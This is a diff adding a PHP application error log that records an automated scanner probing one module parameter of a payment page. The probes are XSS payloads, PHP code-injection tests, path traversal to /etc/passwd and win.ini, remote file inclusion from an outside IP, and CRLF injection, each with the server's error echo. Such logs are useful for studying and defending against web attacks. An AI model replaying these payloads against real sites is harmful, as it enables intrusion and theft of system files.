@@ -1,0 +1,122 @@
+[ 2016-01-02T03:30:23+08:00 ] 121.42.0.16 /wml/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&c=Pay&a=join&id=327
+ERR: 无法加载模块:PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+[ 2016-01-02T03:30:47+08:00 ] 121.42.0.16 /wml/index.php?m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&c=Pay&a=join&id=327
+ERR: 无法加载模块:AmF2YXNjcmlwdDpwcm9tcHQoMTExKTt4
+
+[ 2016-01-02T03:31:47+08:00 ] 121.42.0.16 /wml/index.php?m=Homei1153540i&c=Pay&a=join&id=327
+ERR: 无法加载模块:Homei1153540i
+
+[ 2016-01-02T03:32:08+08:00 ] 121.42.0.16 /wml/index.php?m=%3CscRipt%3E8976%3C/sCript%3E&c=Pay&a=join&id=327
+ERR: 无法加载模块:8976
+
+[ 2016-01-02T03:32:20+08:00 ] 121.42.0.16 /wml/index.php?m=Home31'13%2242%3C24%3E99&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home31'13"4299
+
+[ 2016-01-02T03:32:44+08:00 ] 121.42.0.16 /wml/index.php?m=Home'+onmouseover=3+d='&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home' onmouseover=3 d='
+
+[ 2016-01-02T03:32:55+08:00 ] 121.42.0.16 /wml/index.php?m=Home%22+onmouseover=3+d=%22&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home" onmouseover=3 d="
+
+[ 2016-01-02T03:33:08+08:00 ] 121.42.0.16 /wml/index.php?m=Home%20onmouseover=3%20d&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home onmouseover=3 d
+
+[ 2016-01-02T03:33:20+08:00 ] 121.42.0.16 /wml/index.php?m=Home'+style=x:expression(a=1)+d='&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home' style=x:expression(a=1) d='
+
+[ 2016-01-02T03:33:32+08:00 ] 121.42.0.16 /wml/index.php?m=Home%22+style=x:expression(a=1)+d=%22&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home" style=x:expression(a=1) d="
+
+[ 2016-01-02T03:33:44+08:00 ] 121.42.0.16 /wml/index.php?m=%20style=x:expression(a=1)%20d&c=Pay&a=join&id=327
+ERR: 无法加载模块: style=x:expression(a=1) d
+
+[ 2016-01-02T03:33:55+08:00 ] 121.42.0.16 /wml/index.php?m=Home'%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed='&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home' 8976d='
+
+[ 2016-01-02T03:34:11+08:00 ] 121.42.0.16 /wml/index.php?m=Home%22%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed=%22&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home" 8976d="
+
+[ 2016-01-02T03:34:26+08:00 ] 121.42.0.16 /wml/index.php?m=Home%20%3C/sCript%3E%3CscRipt%3E8976%3C/sCript%3Ed&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home 8976d
+
+[ 2016-01-02T03:34:41+08:00 ] 121.42.0.16 /wml/index.php?m=Home%20%3C/sCript/%3E%3CscRipt%3Ealert(9876)%3C/sCript/%3E//&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home alert(9876)//
+
+[ 2016-01-02T03:34:55+08:00 ] 121.42.0.16 /wml/index.php?m=javascript:alert1987&c=Pay&a=join&id=327
+ERR: 无法加载模块:Javascript:alert1987
+
+[ 2016-01-02T03:35:08+08:00 ] 121.42.0.16 /wml/index.php?m=8314'%224138&c=Pay&a=join&id=327
+ERR: 无法加载模块:8314'"4138
+
+[ 2016-01-02T03:35:26+08:00 ] 121.42.0.16 /wml/index.php?m=);9527();//&c=Pay&a=join&id=327
+ERR: 无法加载模块:);9527();//
+
+[ 2016-01-02T03:35:39+08:00 ] 121.42.0.16 /wml/index.php?m=%253CScRiPt%253Ewindow.a%3D%3D1%3F1%3Aalert%28a%3D1%29%253C%2FScRiPt%253E&c=Pay&a=join&id=327
+ERR: 无法加载模块:%3CScRiPt%3Ewindow.a==1?1:alert(a=1)%3C/ScRiPt%3E
+
+[ 2016-01-02T03:35:54+08:00 ] 121.42.0.16 /wml/index.php?m=%2B%2F%76%2F%25%32%30%2B%41%44%77%2D%73%63%72%69%70%74%2B%41%44%34%2D%61%6C%65%72%74%28%31%39%38%29%2B%41%44%77%2D%2F%73%63%72%69%70%74%2B%41%44%34%2D&c=Pay&a=join&id=327
+ERR: 无法加载模块:+/v/%20+ADw-script+AD4-alert(198)+ADw-/script+AD4-
+
+[ 2016-01-02T03:36:09+08:00 ] 121.42.0.58 /wml/index.php?m='-document.write(2313333+5829313)-'&c=Pay&a=join&id=327
+ERR: 无法加载模块:'-document.write(2313333 5829313)-'
+
+[ 2016-01-02T03:36:27+08:00 ] 121.42.0.67 /wml/index.php?m=expression(document.write(2313333+5829313));x:&c=Pay&a=join&id=327
+ERR: 无法加载模块:Expression(document.write(2313333 5829313));x:
+
+[ 2016-01-02T03:37:36+08:00 ] 121.42.0.16 /wml/index.php/i1153540i/?m=Home&c=Pay&a=pay_result&order_id=$order_id
+ERR: 无法加载模块:I1153540i
+
+[ 2016-01-02T04:01:32+08:00 ] 121.42.0.16 /wml/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&c=Pay&a=join&id=327
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2016-01-02T04:01:56+08:00 ] 121.42.0.16 /wml/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&c=Pay&a=join&id=327
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2016-01-02T04:05:11+08:00 ] 121.42.0.16 /wml/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&c=Pay&a=join&id=327
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();/*
+
+[ 2016-01-02T04:10:56+08:00 ] 121.42.0.56 /wml/index.php?m=Home'%22%3E%3Ciframe%20onload=alert()%3E&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home'">
+
+[ 2016-01-02T04:13:57+08:00 ] 121.42.0.73 /wml/index.php?m=Home'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home'">
+
+[ 2016-01-02T04:17:52+08:00 ] 121.42.0.59 /wml/index.php?m=Home'%22%3E%3Csvg%20onload=prompt()%3E&c=Pay&a=join&id=327
+ERR: 无法加载模块:Home'">
+
+[ 2016-01-02T04:18:06+08:00 ] 121.42.0.16 /wml/index.php?m=%2Fetc%2Fpasswd&c=Pay&a=join&id=327
+ERR: 无法加载模块:/etc/passwd
+
+[ 2016-01-02T04:18:19+08:00 ] 121.42.0.16 /wml/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&c=Pay&a=join&id=327
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+
+[ 2016-01-02T04:18:32+08:00 ] 121.42.0.16 /wml/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&c=Pay&a=join&id=327
+ERR: 无法加载模块:../../../../../../../../etc/passwd.jpg
+
+[ 2016-01-02T04:18:46+08:00 ] 121.42.0.16 /wml/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&c=Pay&a=join&id=327
+ERR: 无法加载模块:../../../../../../../../../../etc/passwd%00
+
+[ 2016-01-02T04:19:02+08:00 ] 121.42.0.16 /wml/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&c=Pay&a=join&id=327
+ERR: 无法加载模块:../../../../../../../../windows/win.ini
+
+[ 2016-01-02T04:19:17+08:00 ] 121.42.0.16 /wml/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&c=Pay&a=join&id=327
+ERR: 无法加载模块:../../../../../../../../windows/win.ini.jpg
+
+[ 2016-01-02T04:19:43+08:00 ] 121.42.0.16 /wml/index.php?m=http://120.26.55.211/s.txt&c=Pay&a=join&id=327
+ERR: 无法加载模块:Http://120.26.55.211/s.txt
+
+[ 2016-01-02T04:19:56+08:00 ] 121.42.0.16 /wml/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&c=Pay&a=join&id=327
+ERR: 无法加载模块:Http://120.26.55.211/s.txt
+
+[ 2016-01-02T04:20:10+08:00 ] 121.42.0.16 /wml/index.php?m=a_long_name_file_not_exist&c=Pay&a=join&id=327
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2016-01-02T04:20:34+08:00 ] 121.42.0.16 /wml/index.php?m=hello%0D%0Aworld%3A111&c=Pay&a=join&id=327
+ERR: 无法加载模块:Hello
+world:111
+
+[ 2016-01-02T04:20:49+08:00 ] 121.42.0.16 /wml/index.php?m=hello%0A%0Dworld&c=Pay&a=join&id=327
+ERR: 无法加载模块:Hello
+world
+
